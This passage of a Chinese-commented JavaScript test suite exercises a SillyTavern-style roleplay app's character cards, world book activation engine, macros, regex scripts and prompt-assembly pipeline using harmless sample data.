    const restored = await cards.restoreVersion(created.id, firstVersion.id);
    assert.equal(restored.data.description, '猫娘', '回滚后要回到旧内容');
    assert.equal(restored.versionCount, 3, '回滚前要自动留一版');

    // 头像：导入 PNG 卡时把图片存下来，导出 PNG 时带回去
    const avatarPng = embedCardInPng(null, { spec: 'chara_card_v2', spec_version: '2.0', data: { name: '阿狸' } });
    await cards.update(created.id, { avatar: avatarPng });
    assert.ok(Buffer.isBuffer(await cards.avatar(created.id)));
    const pngOut = await cards.write(created.id, { format: 'png' });
    assert.equal(pngOut.mime, 'image/png');
    assert.equal(parseCardBuffer(pngOut.buffer, 'x.png').data.name, '阿狸');

    const jsonOut = await cards.write(created.id, { format: 'json' });
    assert.equal(JSON.parse(jsonOut.buffer.toString('utf8')).data.description, '猫娘');
    assert.equal((await cards.document(created.id, { spec: 'v3' })).spec, 'chara_card_v3');

    // 批量导入：一张好的 + 一个坏文件，坏的别拖垮好的
    const good = Buffer.from(JSON.stringify({ name: '琥珀', description: '狐狸' }));
    const imported = await cards.importFiles([
      { name: 'a.json', buffer: good },
      { name: 'bad.txt', buffer: Buffer.from('不是卡') },
    ]);
    assert.equal(imported.imported, 1);
    assert.equal(imported.skipped, 1);
    assert.equal(imported.errors[0].name, 'bad.txt');
    assert.equal((await cards.stats()).total, 2);

    // 删掉一张，剩下的还在
    await cards.remove(created.id);
    assert.equal(await cards.get(created.id), null);
    assert.equal((await cards.stats()).total, 1);
  } finally {
    cleanup();
  }
});

// ---------- 世界书 ----------

const TAVERN_BOOK = {
  name: '旧书店',
  description: '测试用',
  scan_depth: 3,
  token_budget: 500,
  recursive_scanning: true,
  entries: {
    0: {
      uid: 0,
      key: ['书店', 'bookshop'],
      keysecondary: ['东街'],
      comment: '书店位置',
      content: '书店在东街尽头。',
      constant: false,
      selective: true,
      selectiveLogic: 3,
      order: 10,
      position: 1,
      disable: false,
      depth: 4,
      probability: 80,
      useProbability: true,
      group: '地点',
      groupOverride: false,
      groupWeight: 120,
      scanDepth: 2,
      caseSensitive: true,
      matchWholeWords: true,
      useGroupScoring: true,
      ignoreBudget: true,
      sticky: 2,
      cooldown: 3,
      delay: 1,
      role: 0,
      vectorized: false,
      excludeRecursion: true,
      x_unknown: '要保留的未知字段',
      extensions: { display_index: 5, x_ext: '扩展里的未知字段' },
    },
  },
};

test('世界书：酒馆 / 卡内两种形状互转，字段与未知字段都不丢', () => {
  assert.equal(detectShape(TAVERN_BOOK), 'tavern');
  const card = convertDocument(TAVERN_BOOK, 'card');
  assert.equal(detectShape(card), 'card');
  assert.ok(Array.isArray(card.entries));
  const entry = card.entries[0];
  assert.deepEqual(entry.keys, ['书店', 'bookshop']);
  assert.deepEqual(entry.secondary_keys, ['东街']);
  assert.equal(entry.insertion_order, 10);
  assert.equal(entry.enabled, true);
  assert.equal(entry.position, 'after_char', '卡内 position 用字符串');
  assert.equal(entry.extensions.depth, 4);
  assert.equal(entry.extensions.probability, 80);
  assert.equal(entry.extensions.group_weight, 120);
  assert.equal(entry.extensions.case_sensitive, true);
  assert.equal(entry.extensions.ignore_budget, true);
  assert.equal(entry.extensions.selectiveLogic, 3);
  assert.equal(entry.x_unknown, '要保留的未知字段');
  assert.equal(entry.extensions.x_ext, '扩展里的未知字段');
  assert.equal(entry.extensions.display_index, 5);

  const back = convertDocument(card, 'tavern');
  assert.equal(detectShape(back), 'tavern');
  const round = back.entries[0];
  assert.deepEqual(round.key, ['书店', 'bookshop']);
  assert.equal(round.order, 10);
  assert.equal(round.disable, false);
  assert.equal(round.position, 1);
  assert.equal(round.x_unknown, '要保留的未知字段');
  assert.equal(round.extensions.x_ext, '扩展里的未知字段');
  assert.equal(round.extensions.display_index, 5);

  const normalized = normalizeWorldBook(TAVERN_BOOK);
  assert.equal(normalized.entries[0].selectiveLogic, 3);
  assert.equal(normalized.entries[0].ignoreBudget, true);
});

test('世界书引擎：关键词 / 正则 / 四种次关键词逻辑 / 扫描深度', () => {
  assert.ok(parseRegexKey('/雨|雪/i'));
  assert.equal(parseRegexKey('普通词'), null);
  assert.ok(matchesKey('雨', '今天下雨了'));
  assert.ok(!matchesKey('雨', '今天天晴', { wholeWords: true }));
  assert.ok(matchesKey('/下[雨雪]/', '今天下雪了'));

  const book = {
    id: 'b',
    name: '测试',
    entries: normalizeWorldBook({
      entries: {
        0: { uid: 0, key: ['永远'], content: '常量', constant: true },
        1: { uid: 1, key: ['雨'], content: '关键词命中' },
        2: { uid: 2, key: ['/下[雨雪]/'], content: '正则命中' },
        3: { uid: 3, key: ['雨'], keysecondary: ['东街'], selective: true, selectiveLogic: WI_LOGIC.AND_ANY, content: 'AND_ANY' },
        4: { uid: 4, key: ['雨'], keysecondary: ['东街', '彩虹'], selective: true, selectiveLogic: WI_LOGIC.AND_ALL, content: 'AND_ALL' },
        5: { uid: 5, key: ['雨'], keysecondary: ['彩虹'], selective: true, selectiveLogic: WI_LOGIC.NOT_ANY, content: 'NOT_ANY' },
        6: { uid: 6, key: ['雨'], keysecondary: ['彩虹', '东街'], selective: true, selectiveLogic: WI_LOGIC.NOT_ALL, content: 'NOT_ALL' },
        7: { uid: 7, key: ['雪'], content: '深度不够' },
      },
    }).entries,
  };
  const result = activateWorldInfo({
    books: [book],
    messages: [{ role: 'user', content: '今天下雨了' }, { role: 'user', content: '东街那边' }],
    settings: { scanDepth: 2, tokenBudget: 10000, contextBudget: 4000 },
    rng: () => 0.5,
  });
  const contents = result.entries.map((entry) => entry.content).sort();
  assert.deepEqual(contents, ['AND_ANY', 'NOT_ALL', 'NOT_ANY', '关键词命中', '正则命中', '常量'].sort());
  assert.ok(!contents.includes('AND_ALL'), 'AND_ALL 需要两个次关键词都在');
  assert.ok(!contents.includes('深度不够'), '最后的雪不在最近的 2 条里');

  const deep = activateWorldInfo({
    books: [book],
    messages: [{ role: 'user', content: '第一句下雪' }, { role: 'user', content: '第二句' }, { role: 'user', content: '第三句' }],
    text: '',
    settings: { scanDepth: 1, tokenBudget: 10000 },
    rng: () => 0.5,
  });
  assert.ok(!deep.entries.some((entry) => entry.content === '深度不够'));

  const shallowEntry = { uid: 9, key: ['雪'], content: '自己带扫描深度', scanDepth: 3 };
  const perEntry = activateWorldInfo({
    books: [{ id: 'b2', name: 'x', entries: normalizeWorldBook({ entries: { 9: shallowEntry } }).entries }],
    messages: [{ role: 'user', content: '第一句下雪' }, { role: 'user', content: '第二句' }, { role: 'user', content: '第三句' }],
    settings: { scanDepth: 1, tokenBudget: 10000 },
    rng: () => 0.5,
  });
  assert.ok(perEntry.entries.some((entry) => entry.content === '自己带扫描深度'), '条目自己的 scanDepth 生效');
});

test('世界书引擎：粘性 / 冷却 / 概率 / 预算 / 位置分类', () => {
  const make = (entries) => ({ id: 'b', name: 'x', entries: normalizeWorldBook({ entries }).entries });

  // sticky：命中后即使不再命中，也还能撑 2 轮
  const stickyBook = make({ 0: { uid: 0, key: ['雨'], content: '粘性', sticky: 2 } });
  const first = activateWorldInfo({ books: [stickyBook], messages: [{ role: 'user', content: '雨' }], settings: {}, rng: () => 0.5 });
  assert.equal(first.entries[0].content, '粘性');
  // 最近 2 条里已经没有"雨"了，但粘性还在
  const second = activateWorldInfo({ books: [stickyBook], messages: [{ role: 'user', content: '雨' }, { role: 'user', content: '晴' }, { role: 'user', content: '晴' }], settings: { scanDepth: 2 }, state: first.state, rng: () => 0.5 });
  assert.ok(second.entries.some((entry) => entry.content === '粘性'), '粘性条目继续生效');
  assert.equal(second.reasons.find((reason) => reason.uid === 0).code, 'sticky');

  // cooldown：命中后 3 轮内不再触发
  const cdBook = make({ 0: { uid: 0, key: ['雨'], content: '冷却', cooldown: 3 } });
  const cd1 = activateWorldInfo({ books: [cdBook], messages: [{ role: 'user', content: '雨' }], settings: {}, rng: () => 0.5 });
  const cd2 = activateWorldInfo({ books: [cdBook], messages: [{ role: 'user', content: '雨' }, { role: 'user', content: '雨' }], settings: {}, state: cd1.state, rng: () => 0.5 });
  assert.equal(cd2.entries.length, 0);
  assert.equal(cd2.reasons.find((reason) => reason.uid === 0).code, 'cooldown');

  // probability：rng 没抽中就跳过
  const probBook = make({ 0: { uid: 0, key: ['雨'], content: '概率', probability: 50, useProbability: true } });
  assert.equal(activateWorldInfo({ books: [probBook], messages: [{ role: 'user', content: '雨' }], settings: {}, rng: () => 0.99 }).entries.length, 0);
  assert.equal(activateWorldInfo({ books: [probBook], messages: [{ role: 'user', content: '雨' }], settings: {}, rng: () => 0.1 }).entries.length, 1);

  // 预算：order 高的先装，装不下的低优先级被砍
  const budgetBook = make({
    0: { uid: 0, key: ['雨'], content: Array(60).fill('高').join(''), order: 200 },
    1: { uid: 1, key: ['雨'], content: Array(60).fill('低').join(''), order: 1 },
  });
  const budgeted = activateWorldInfo({ books: [budgetBook], messages: [{ role: 'user', content: '雨' }], settings: { tokenBudget: 30 }, rng: () => 0.5 });
  assert.equal(budgeted.entries.length, 1);
  assert.ok(budgeted.entries[0].content.startsWith('高'));
  assert.equal(budgeted.reasons.find((reason) => reason.uid === 1).code, 'budget');

  // 位置分类：before / after / atDepth
  const posBook = make({
    0: { uid: 0, key: ['雨'], content: '前', position: WI_POSITION.before },
    1: { uid: 1, key: ['雨'], content: '后', position: WI_POSITION.after },
    2: { uid: 2, key: ['雨'], content: '深处', position: WI_POSITION.atDepth, depth: 2, role: 1 },
  });
  const positioned = activateWorldInfo({ books: [posBook], messages: [{ role: 'user', content: '雨' }], settings: {}, rng: () => 0.5 });
  assert.deepEqual(positioned.before, ['前']);
  assert.deepEqual(positioned.after, ['后']);
  assert.equal(positioned.atDepth[0].depth, 2);
  assert.equal(positioned.atDepth[0].role, 1);
});

test('世界书服务：条目 CRUD、试触发解释、导入导出与形状转换', async () => {
  const { db, cleanup } = makeTempDb();
  try {
    const store = createWorldbookStore({ repo: db.repo });
    const worldbook = createWorldbookService({ settings: {}, ports: { worldbookStore: store } });

    const book = await worldbook.save({ name: '旧书店', data: TAVERN_BOOK });
    assert.ok(book.id.startsWith('wb_'));
    assert.equal(book.spec, 'tavern');
    assert.equal(book.entryCount, 1);

    const entries = await worldbook.entries(book.id);
    assert.equal(entries.total, 1);
    assert.deepEqual(entries.items[0].keys, ['书店', 'bookshop']);
    assert.equal(entries.items[0].x_unknown, '要保留的未知字段', '读条目要带上原始文档里的未知字段');

    const added = await worldbook.saveEntry(book.id, { keys: ['雪'], content: '下雪了', comment: '雪', order: 5, position: WI_POSITION.before });
    assert.equal(added.uid, 1, '新条目的 uid 应该接着最大 uid');
    assert.equal((await worldbook.entries(book.id)).total, 2);

    const updated = await worldbook.saveEntry(book.id, { ...added, content: '下大雪了' });
    assert.equal(updated.content, '下大雪了');
    assert.deepEqual(updated.keys, ['雪']);

    // 试触发：一段话，看命中谁、为什么
    const trigger = await worldbook.testTrigger(book.id, { text: '今天下雨了，东街那边有家书店' });
    assert.equal(trigger.scanned, 2);
    assert.ok(trigger.entries.some((entry) => entry.content.includes('书店在东街尽头')));
    const snowReason = trigger.reasons.find((reason) => reason.uid === 1);
    assert.equal(snowReason.activated, false);
    assert.equal(snowReason.code, 'no-primary');
    assert.ok(trigger.reasons.find((reason) => reason.uid === 0).detail.length > 0, '命中要给出理由');

    // 导出成卡内形状：映射对、未知字段不丢
    const exported = await worldbook.exportFile(book.id, { shape: 'card' });
    const cardDoc = JSON.parse(exported.buffer.toString('utf8'));
    assert.ok(Array.isArray(cardDoc.entries));
    assert.equal(cardDoc.entries[0].insertion_order, 10);
    assert.equal(cardDoc.entries[0].x_unknown, '要保留的未知字段');

    // 导入一份酒馆世界书
    const imported = await worldbook.importFiles([{ name: 'another.json', text: JSON.stringify(TAVERN_BOOK) }]);
    assert.equal(imported.imported, 1);
    assert.equal(imported.items[0].name, 'another');
    assert.equal((await worldbook.list()).total, 2);

    // 不落库的形状转换
    const converted = await worldbook.convertShape(TAVERN_BOOK, 'card');
    assert.equal(converted.shape, 'card');
    assert.equal(converted.sourceShape, 'tavern');
    assert.ok(Array.isArray(converted.document.entries));

    // 删条目 / 删书
    await worldbook.removeEntry(book.id, 1);
    assert.equal((await worldbook.entries(book.id)).total, 1);
    await worldbook.remove(book.id);
    assert.equal(await worldbook.get(book.id), null);
  } finally {
    cleanup();
  }
});

// ---------- 提示词 ----------

test('宏：内置宏、变量、条件块、自定义宏、旧式尖括号', () => {
  const expand = (text, ctx) => expandMacros(text, ctx).text;
  assert.equal(expand('{{char}} 和 {{user}}，{{persona}}', { char: '阿狸', user: '我', persona: '旅人' }), '阿狸 和 我，旅人');
  assert.equal(expand('<USER> 对 <CHAR> 说：<GROUP>', { char: '阿狸', user: '我', group: '主角团' }), '我 对 阿狸 说：主角团');
  assert.equal(expand('a{{//注释}}b{{newline}}c', {}), 'ab\nc');
  assert.equal(expand('{{random:甲,乙}}', { rng: () => 0 }), '甲');
  assert.equal(expand('{{roll:2d6}}', { rng: () => 0 }), '2');
  assert.equal(expand('{{getvar::hp}}/{{setvar::mood::开心}}', { vars: { hp: 7 } }), '7/');
  assert.equal(expandMacros('{{setvar::mood::开心}}', {}).writes[0].key, 'mood');

  // 条件块 + .局部变量 / ! 取反
  const ctx = createMacroContext({ vars: { hp: '3', dead: '' } });
  assert.equal(evaluateMacros('{{if .hp}}有血{{else}}没血{{/if}}', ctx), '有血');
  assert.equal(evaluateMacros('{{if .dead}}活着{{else}}倒下了{{/if}}', ctx), '倒下了');
  assert.equal(evaluateMacros('{{if !.dead}}还能打{{/if}}', ctx), '还能打');

  // 自定义宏（值是纯文本，也能再套内置宏）
  assert.equal(expand('{{称呼}}在{{称呼}}家', { macros: { 称呼: '阿狸' } }), '阿狸在阿狸家');
  assert.equal(expand('{{自称}}', { macros: { 自称: '{{char}}大人' }, char: '琥珀' }), '琥珀大人');
  // 不认识的宏原样保留
  assert.equal(expand('{{nonexistent}}', {}), '{{nonexistent}}');
});

test('宏：SillyTavern 驼峰别名兜底（charDescription / charVersion 等）', () => {
  const ctx = createMacroContext({
    charName: '阿狸',
    userName: '我',
    character: {
      name: '阿狸',
      description: '一只猫',
      personality: '傲娇',
      scenario: '下雨天',
      first_mes: '你好',
      mes_example: '示例对话',
      creator_notes: '作者注',
      character_version: '2.1',
      creator: '某人',
    },
  });
  assert.equal(evaluateMacros('{{charDescription}}', ctx), '一只猫');
  assert.equal(evaluateMacros('{{charPersonality}}', ctx), '傲娇');
  assert.equal(evaluateMacros('{{charScenario}}', ctx), '下雨天');
  assert.equal(evaluateMacros('{{charCreatorNotes}}', ctx), '作者注');
  assert.equal(evaluateMacros('{{charFirstMessage}}', ctx), '你好');
  assert.equal(evaluateMacros('{{greeting}}', ctx), '你好');
  assert.equal(evaluateMacros('{{charVersion}}', ctx), '2.1');
  assert.equal(evaluateMacros('{{version}}', ctx), '2.1');
  assert.equal(evaluateMacros('{{char_version}}', ctx), '2.1');
  assert.equal(evaluateMacros('{{mesExamples}}', ctx), '示例对话');
  assert.equal(evaluateMacros('{{groupNotMuted}}', ctx), '');
});

test('正则脚本：placement、捕获组、{{match}}、trimStrings', () => {
  assert.ok(regexFromString('/a(\\d)/gi') instanceof RegExp);
  const script = normalizeScript({ scriptName: '编号', findRegex: '/a(\\d)/g', replaceString: '[a$1]', placement: [regex_placement.USER_INPUT] });
  assert.equal(runRegexScript(script, 'a1 b a2'), '[a1] b [a2]');
  assert.equal(runRegexScript(normalizeScript({ findRegex: '/x/g', replaceString: '<{{match}}>', placement: [1] }), 'x'), '<x>');
  assert.equal(runRegexScript(normalizeScript({ findRegex: '/a(b)c/g', replaceString: '$1', trimStrings: ['b'], placement: [1] }), 'abc'), '');

  const scripts = [normalizeScript({ findRegex: '/阿狸/g', replaceString: '小狸', placement: [regex_placement.USER_INPUT] })];
  assert.equal(getRegexedString('阿狸你好', regex_placement.USER_INPUT, { scripts, isPrompt: true }), '小狸你好');
  assert.equal(getRegexedString('阿狸你好', regex_placement.AI_OUTPUT, { scripts, isPrompt: true }), '阿狸你好', '位置不匹配就不该动手');

  // 只改显示：只在 isMarkdown 时生效
  const displayOnly = [normalizeScript({ findRegex: '/喵/g', replaceString: '汪', markdownOnly: true, placement: [regex_placement.AI_OUTPUT] })];
  assert.equal(getRegexedString('喵', regex_placement.AI_OUTPUT, { scripts: displayOnly, isMarkdown: true }), '汪');
  assert.equal(getRegexedString('喵', regex_placement.AI_OUTPUT, { scripts: displayOnly, isPrompt: true }), '喵');

  // 按深度只在最近几条生效
  const depthScript = [normalizeScript({ findRegex: '/旧/g', replaceString: '新', placement: [regex_placement.USER_INPUT], maxDepth: 0 })];
  assert.equal(getRegexedString('旧的', regex_placement.USER_INPUT, { scripts: depthScript, isPrompt: true, depth: 5 }), '旧的');
  assert.equal(getRegexedString('旧的', regex_placement.USER_INPUT, { scripts: depthScript, isPrompt: true, depth: 0 }), '新的');
});

test('提示词阶段管线：预设队列、作者注位置、裁剪策略、踢段', () => {
  const base = {
    card: { name: '阿狸', description: '一只猫', mes_example: '{{user}}: 在吗' },
    history: [{ role: 'user', content: '你好' }, { role: 'assistant', content: '喵' }],
    settings: { contextBudget: 4000 },
  };

  const assembled = assemblePrompt(base);
  const stageOrder = ['global-system', 'character-system', 'persona', 'preset-queue', 'worldbook', 'memory', 'databank', 'authors-note', 'examples', 'history', 'prefill', 'suffix', 'stop-strings', 'post-process'];
  const indices = assembled.sections.map((section) => stageOrder.indexOf(section.stage));
  assert.deepEqual(indices, [...indices].sort((a, b) => a - b));
  assert.equal(assembled.messages.length, 2);

  // 预设队列：system 段落进 system，user/assistant 段落进 messages
  const withPreset = assemblePrompt({
    ...base,
    preset: { prompts: [
      { identifier: 'main', name: '主提示', role: 'system', content: '你是 {{char}}' },
      { identifier: 'user-line', name: '示例', role: 'user', content: '你好呀' },
      { identifier: 'off', name: '关掉的', role: 'system', content: '不该出现', enabled: false },
    ] },
  });
  assert.ok(withPreset.sections.some((section) => section.id === 'preset:main'));
  assert.ok(!withPreset.sections.some((section) => section.id === 'preset:off'));
  assert.ok(withPreset.messages[0].content.startsWith('你好呀'), '预设里的 user 段落要进 messages');

  // 作者注：历史前 / 历史后 / 指定深度
  const before = assemblePrompt({ ...base, settings: { authorNote: '注意', authorNotePosition: 'before' } });
  assert.ok(before.sections.some((section) => section.id === 'authors-note' && section.stage === 'authors-note'));
  const after = assemblePrompt({ ...base, settings: { authorNote: '注意', authorNotePosition: 'after' } });
  assert.ok(after.sections.some((section) => section.id === 'authors-note' && section.stage === 'suffix'));
  assert.equal(after.messages[after.messages.length - 1].content, '注意');
  const atDepth = assemblePrompt({ ...base, settings: { authorNote: '注意', authorNotePosition: 'atDepth', authorNoteDepth: 0 } });
  assert.equal(atDepth.messages[atDepth.messages.length - 1].content, '注意');

  // 前置词 / 后置词 / 停止串
  const tail = assemblePrompt({ ...base, settings: { prefill: '（我接着说）', suffix: '只输出对话', stopStrings: ['</s>'] } });
  assert.equal(tail.messages[tail.messages.length - 1].role, 'system', '后置词放在最末尾');
  assert.equal(tail.messages[tail.messages.length - 1].content, '只输出对话');
  assert.ok(tail.messages.some((message) => message.role === 'assistant' && message.content === '（我接着说）'));
  assert.ok(tail.sections.some((section) => section.id === 'suffix'));
  assert.ok(!tail.system.includes('只输出对话'), '后置词不该重复出现在最前面的系统提示里');
  assert.deepEqual(tail.params.stopStrings, ['</s>']);

  // 裁剪策略：keepFirst 丢尾部
  // 交替角色：相邻同角色会被合并，这里想看的是裁剪本身
  const many = Array.from({ length: 30 }, (_v, i) => ({ role: i % 2 === 0 ? 'user' : 'assistant', content: `第 ${i} 句` }));
  const keepFirst = assemblePrompt({ card: { name: 'x' }, history: many, settings: { historyLimit: 5, trimStrategy: 'keepFirst', contextBudget: 0 } });
  assert.equal(keepFirst.messages.length, 5);
  assert.equal(keepFirst.messages[0].content, '第 0 句');
  assert.ok(keepFirst.notes.some((note) => note.includes('裁剪')));
  const dropMiddle = assemblePrompt({ card: { name: 'x' }, history: many, settings: { historyLimit: 6, trimStrategy: 'dropMiddle', contextBudget: 0 } });
  assert.equal(dropMiddle.messages.length, 6);
  assert.equal(dropMiddle.messages[0].content, '第 0 句');
  assert.equal(dropMiddle.messages[dropMiddle.messages.length - 1].content, '第 29 句');

  // 手动踢掉一段
  const kicked = assemblePrompt({ ...base, dropSections: ['examples'] });
  assert.ok(!kicked.sections.some((section) => section.id === 'examples'));
  assert.ok(kicked.notes.some((note) => note.includes('手动丢掉')));
});

test('提供方参数覆盖：不认的参数丢掉（含预设带来的）、专属参数按路径拼进请求体', () => {
  const result = applyParamOverrides(
    { temperature: 0.9, top_k: 40, seed: 7, thinking_level: 'low', budget: 2.5 },
    {
      disabled: ['top_k', 'seed'],
      custom: [
        { key: 'thinking_level', type: 'enum', path: 'top' },
        { key: 'budget', type: 'number', path: 'generationConfig.thinkingConfig.thinkingBudget' },
      ],
    },
  );
  assert.deepEqual(result.dropped, ['top_k', 'seed'], '不认的已知参数要被点名丢掉');
  assert.equal(result.params.top_k, undefined, 'top_k 不能再出现在请求参数里');
  assert.equal(result.params.temperature, 0.9, '没动过的参数原样留着');
  assert.equal(result.extraPatch.thinking_level, 'low', 'path=top 的专属参数放请求体顶层');
  assert.equal(result.extraPatch.generationConfig.thinkingConfig.thinkingBudget, 2.5, '点号路径要嵌进去');
  assert.equal(result.params.thinking_level, undefined, '专属参数别在 params 里重复发一遍');

  // 深合并：原来 extraBody 里那层的字段不能被顶掉
  const merged = mergeDeep({ generationConfig: { temperature: 1 } }, result.extraPatch);
  assert.equal(merged.generationConfig.temperature, 1, '深合并要保留同一层的原有字段');
  assert.equal(merged.generationConfig.thinkingConfig.thinkingBudget, 2.5);

  // 值是空的 = 什么都不做（不被覆盖表"凭空"写进请求）
  const empty = applyParamOverrides({ temperature: 0.5 }, { disabled: ['top_k'], custom: [{ key: 'thinking_level', type: 'enum', path: 'top' }] });
  assert.deepEqual(empty.extraPatch, {});
  assert.deepEqual(empty.dropped, []);

  // 按模型名自动禁用：Google 这代（3.6/3.7 flash、3.5 flash-lite）不收 temperature/topP/topK
  // —— 依据是酒馆源码里那句 noSamplingModel（他们注释引的是 Google 的 api-changes 文档）
  const policy = modelParamPolicy('gemini-3.7-flash');
  assert.deepEqual(policy.disable.sort(), ['temperature', 'top_k', 'top_p'].sort());
  assert.equal(modelParamPolicy('gemini-2.5-pro').disable.length, 0, '老一代不该被禁');
  const auto = applyParamOverrides({ temperature: 0.9, top_p: 0.9, top_k: 40, seed: 7, max_tokens: 2000 }, {}, { model: 'gemini-3.7-flash' });
  assert.equal(auto.params.temperature, undefined, '这代的 temperature 要自动丢掉');
  assert.equal(auto.params.top_p, undefined);
  assert.equal(auto.params.top_k, undefined);
  assert.equal(auto.params.seed, 7, 'seed 照旧能发（酒馆也保留它）');
  assert.equal(auto.params.max_tokens, 2000, 'max_tokens 当然留着');
  assert.ok(auto.dropped.every((item) => item.includes('按模型规则')), '说明里要标出是"按模型规则"丢的');
});

test('对话级配置：提示词 / 前置词 / 后置词能盖住卡片级（留空 = 跟随卡片）', () => {
  const card = {
    name: '阿狸',
    system_prompt: '卡片级的系统提示',
    prefix_text: '卡片的前置',
    suffix_text: '卡片的后置',
  };
  const base = { card, history: [{ role: 'user', content: '你好' }], settings: {} };
  const lastUser = (result) => [...result.messages].reverse().find((message) => message.role === 'user')?.content ?? '';

  // 没写覆盖键：三样都按卡片级来
  const inherited = assemblePrompt(base);
  assert.ok(inherited.system.includes('卡片级的系统提示'));
  assert.equal(lastUser(inherited), '卡片的前置\n\n你好\n\n卡片的后置');

  // 写了覆盖键：换成对话级那份，卡片级那份不许再进去
  const overridden = assemblePrompt({
    ...base,
    settings: { cardSystemPrompt: '对话级的系统提示', prefixText: '对话的前置', suffixText: '对话的后置' },
  });
  assert.ok(overridden.system.includes('对话级的系统提示'));
  assert.ok(!overridden.system.includes('卡片级的系统提示'), '覆盖之后卡片级那份不该还在');
  assert.equal(lastUser(overridden), '对话的前置\n\n你好\n\n对话的后置');
  assert.ok(overridden.notes.some((note) => note.includes('前置词（这个对话覆盖的）')));

  // 覆盖键在、值是空串：这一样就真的不要了（不是"退回卡片级"）
  const blank = assemblePrompt({ ...base, settings: { cardSystemPrompt: '', prefixText: '', suffixText: '' } });
  assert.ok(!blank.system.includes('卡片级的系统提示'), '覆盖成空就得把卡片级那份也拿掉');
  assert.equal(lastUser(blank), '你好');
  assert.ok(blank.notes.some((note) => note.includes('覆盖成空的')));

  // {{original}} 在对话级覆盖里照样能用
  const withOriginal = assemblePrompt({
    card,
    history: [{ role: 'user', content: '你好' }],
    settings: { systemPrompt: '内置那句', cardSystemPrompt: '在前面\n{{original}}' },
  });
  assert.ok(withOriginal.system.includes('在前面'));
  assert.ok(withOriginal.system.includes('内置那句'));
});

test('提示词服务：预设 / 宏 / 正则 / 片段 CRUD 与 X 光重算', async () => {
  const { db, cleanup } = makeTempDb();
  try {
    const store = createPromptStore({ repo: db.repo });
    const prompts = createPromptService({ settings: {}, ports: { promptStore: store } });

    // 宏
    await prompts.saveMacro('称呼', '阿狸');
    assert.equal((await prompts.listMacros())['称呼'], '阿狸');
    const macroAssembled = await prompts.preview({ card: { name: 'x' }, settings: { systemPrompt: '你好 {{称呼}}' } });
    assert.ok(macroAssembled.text.includes('你好 阿狸'));
    await prompts.removeMacro('称呼');
    assert.deepEqual(await prompts.listMacros(), {});

    // 正则
    const script = await prompts.saveRegex({ name: '改名', findRegex: '/阿狸/g', replaceString: '小狸', placement: [regex_placement.USER_INPUT] });
    assert.ok(script.id.startsWith('regex_'));
    const regexPreview = await prompts.preview({ card: { name: '阿狸' }, history: [{ role: 'user', content: '阿狸' }] });
    assert.ok(regexPreview.text.includes('小狸'));
    assert.equal((await prompts.listRegex()).total, 1);
    await prompts.removeRegex(script.id);
    assert.equal((await prompts.listRegex()).total, 0);

    // 预设
    const preset = await prompts.importPreset({ name: '我的预设', prompts: [{ identifier: 'main', role: 'system', content: '你是 {{char}}' }] }, { name: '我的预设' });
    assert.equal((await prompts.listPresets()).total, 1);
    const exported = await prompts.exportPreset(preset.id);
    assert.equal(JSON.parse(exported.buffer.toString('utf8')).prompts.length, 1);
    const withPreset = await prompts.preview({ card: { name: '琥珀' }, presetId: preset.id });
    assert.ok(withPreset.sections.some((section) => section.id === 'preset:main'));
    await assert.rejects(() => prompts.importPreset({ nope: true }, {}), ValidationError);
    await prompts.removePreset(preset.id);

    // 酒馆预设的顺序表 + 位置标记：角色描述要落在 <{{char}}> 与 </{{char}}> 中间，
    // 历史按 Chat History 标记插，排在它后面的条目要接到对话末尾（越狱预设靠这个压轴）。
    const markerPreset = {
      name: '带标记的预设',
      prompts: [
        { identifier: 'wrap-open', name: '开标签', role: 'system', content: '<{{char}}>' },
        { identifier: 'charDescription', name: 'Char Description', role: 'system', marker: true },
        { identifier: 'charPersonality', name: 'Char Personality', role: 'system', marker: true },
        { identifier: 'wrap-close', name: '闭标签', role: 'system', content: '</{{char}}>' },
        { identifier: 'dialogueExamples', name: 'Chat Examples', role: 'system', marker: true },
        { identifier: 'chatHistory', name: 'Chat History', role: 'system', marker: true },
        { identifier: 'tail', name: '压轴指令', role: 'system', content: '结尾别忘了给出三个选项' },
        { identifier: 'deep', name: '深度注入', role: 'system', content: '插在对话里的提醒', injection_position: 1, injection_depth: 1 },
      ],
      prompt_order: [{ character_id: 100000, order: [
        { identifier: 'wrap-open', enabled: true },
        { identifier: 'charDescription', enabled: true },
        { identifier: 'charPersonality', enabled: true },
        { identifier: 'wrap-close', enabled: true },
        { identifier: 'dialogueExamples', enabled: true },
        { identifier: 'chatHistory', enabled: true },
        { identifier: 'tail', enabled: true },
        { identifier: 'deep', enabled: true },
      ] }],
    };
    const laidOut = assemblePrompt({
      card: { name: '琥珀', description: '一只会说话的猫', personality: '懒' },
      history: [{ role: 'user', content: '你好' }, { role: 'assistant', content: '喵' }],
      settings: {},
      preset: markerPreset,
    });
    const orderOf = (id) => laidOut.sections.findIndex((section) => section.id === id);
    assert.ok(orderOf('preset:wrap-open') < orderOf('card-description'), '开标签要在角色描述前面');
    assert.ok(orderOf('card-description') < orderOf('card-personality'), '描述在性格前面');
    assert.ok(orderOf('card-personality') < orderOf('preset:wrap-close'), '闭标签要包住描述与性格');
    assert.ok(
      laidOut.sections[orderOf('preset:wrap-open')].content === '<琥珀>' && laidOut.sections[orderOf('preset:wrap-close')].content === '</琥珀>',
      '宏要展开成角色名',
    );
    assert.ok(orderOf('examples') < orderOf('history'), '对话示例按标记排在历史前面');
    // 压轴指令不能出现在最前面的系统提示里（否则模型会看到两遍）
    assert.ok(!laidOut.system.includes('结尾别忘了给出三个选项'), '历史之后的条目不该再进系统提示');
    assert.equal(laidOut.messages.at(-1).role, 'system', '历史之后的条目接在对话末尾');
    assert.ok(laidOut.messages.at(-1).content.includes('结尾别忘了给出三个选项'));
    // 绝对位置：按深度插进对话
    const deepIndex = laidOut.messages.findIndex((message) => message.content.includes('插在对话里的提醒'));
    assert.ok(deepIndex > 0 && deepIndex < laidOut.messages.length - 1, '深度注入要落在对话中间');
    assert.ok(!laidOut.system.includes('插在对话里的提醒'), '深度注入也不该进系统提示');
    assert.ok(laidOut.notes.some((note) => note.includes('位置标记已生效')));

    // 没有顺序表的老预设：照旧按数组顺序，一条都不能少
    const flat = assemblePrompt({
      card: { name: '琥珀' },
      history: [{ role: 'user', content: '你好' }],
      settings: {},
      preset: { prompts: [{ identifier: 'a', role: 'system', content: '一' }, { identifier: 'b', role: 'system', content: '二', enabled: false }] },
    });
    assert.ok(flat.sections.some((section) => section.id === 'preset:a'));
    assert.ok(!flat.sections.some((section) => section.id === 'preset:b'), '关掉的条目不能进');
    assert.equal(flat.messages.length, 1);

